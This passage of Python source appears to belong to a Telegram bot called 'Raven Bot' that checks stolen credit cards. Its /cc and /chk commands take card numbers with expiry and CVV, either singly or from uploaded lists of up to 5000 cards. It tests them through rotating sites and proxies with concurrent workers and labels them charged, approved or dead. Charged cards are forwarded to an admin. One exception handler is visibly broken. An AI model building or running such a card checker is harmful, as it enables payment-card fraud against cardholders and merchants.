        await event.delete()
    except:
        pass
    await send_start_video_and_welcome(user_id, username)

@bot.on(events.CallbackQuery(pattern="pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        try:
            await event.answer("⏸️ Paused", alert=True)
        except:
            pass

@bot.on(events.CallbackQuery(pattern="resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        try:
            await event.answer("▶️ Resumed", alert=True)
        except:
            pass

@bot.on(events.CallbackQuery(pattern="stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        try:
            await event.answer("🛑 Stopped", alert=True)
        except:
            pass
        try:
            await event.edit(premium_emoji("⛔ <b>Checking stopped by user</b>"), parse_mode='html')
        except:
            pass

@bot.on(events.CallbackQuery(pattern="view_live"))
async def view_live_callback(event):
    try:
        await event.answer("Showing Live Hits", alert=True)
    except:
        pass

@bot.on(events.CallbackQuery(pattern="view_all"))
async def view_all_callback(event):
    try:
        await event.answer("Showing All Results", alert=True)
    except:
        pass

# ==================== CC & TOOLS COMMANDS ====================

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Sites or proxies not configured."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"⏳ <b>Checking card...</b>"), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES)
        response_msg = result.get('message', '').lower()
        is_otp_or_3ds = 'otp_required' in response_msg or '3ds_required' in response_msg

        if result['status'] == 'Charged':
            await forward_charge_to_admin(card, result, user_id, username)
            await send_animated_result(user_id, result, 'Charged', username)
        elif result['status'] == 'Approved':
            if is_otp_or_3ds:
                await send_otp_result(user_id, result, username)
            else:
                await send_animated_result(user_id, result, 'Approved', username)
        else:
            await event.reply(premium_emoji(f"Card : <code>{card}</code>\nStatus : Declined ❌\nRaw : {result.get('message', 'DECLINED')}"), parse_mode='html')

        try:
            await status_msg.delete()
        except:
            pass
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file"), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Sites or proxies missing."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("📦 Processing file..."), parse_mode='html')
    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found"), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        cards = cards[:5000]

    os.remove(file_path)
    total_cards = len(cards)

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'errors': 0,
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)

        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(0.5)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return

                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                res = await check_card_with_retry(card, sites, proxies, max_retries=MAX_RETRIES)
                all_results['checked'] += 1

                if res.get('status') == 'Site Error':
                    all_results['errors'] += 1

                response_msg = res.get('message', '').lower()
                is_otp_or_3ds = 'otp_required' in response_msg or '3ds_required' in response_msg

                try:
                    if res['status'] == 'Charged':
                        all_results['charged'].append(res)
                        await forward_charge_to_admin(card, res, user_id, username)
                        await send_animated_result(user_id, res, 'Charged', username)
                    elif res['status'] == 'Approved':
                        if is_otp_or_3ds:
                            all_results['approved'].append(res)
                            await send_otp_result(user_id, res, username)
                        else:
                            all_results['approved'].append(res)
                            await send_animated_result(user_id, res, 'Approved', username)
                    else:
                        all_results['dead'].append(res)
                except Exception as e:
                    print(f"Error: {e}")
                    all_results['dead'].append(res)

                queue.task_done()
                now = time.time()
                if now - last_update_time[0] >= PROGRESS_UPDATE_INTERVAL:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], username)
                        except:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(WORKER_COUNT)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=0.5)
            workers = list(pending)

        if session_key in active_sessions:
            try:
                await update_progress(user_id, status_msg.id, all_results, all_results['checked'], username)
            except:
                pass

        stats = load_stats()
        stats['total_checks'] = stats.get('total_checks', 0) + len(cards)
        stats['total_hits'] = stats.get('total_hits', 0) + len(all_results['charged']) + len(all_results['approved'])
        save_stats(stats)

    except Exception as मैंने:
        print(f"Check error: {e}")
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        try:
            await send_final_results(user_id, all_results)
        except:
            pass

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return

    stats = load_stats()
    if 'users' not in stats:
        stats['users'] = {}
    if str(user_id) not in stats['users']:
        stats['users'][str(user_id)] = {'checks': 0, 'hits': 0, 'joined': datetime.now().strftime("%d.%m.%Y"), 'credits': 797}
    save_stats(stats)

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    await send_start_video_and_welcome(user_id, username)

# ==================== MAIN ====================
bot_start_time = time.time()
print("✅ Raven Bot Started Successfully!")
print("👑 Owner: @Rowdyking07")

try:
    bot.run_until_disconnected()
finally:
    if http_session and not http_session.closed:
        asyncio.run(http_session.close())
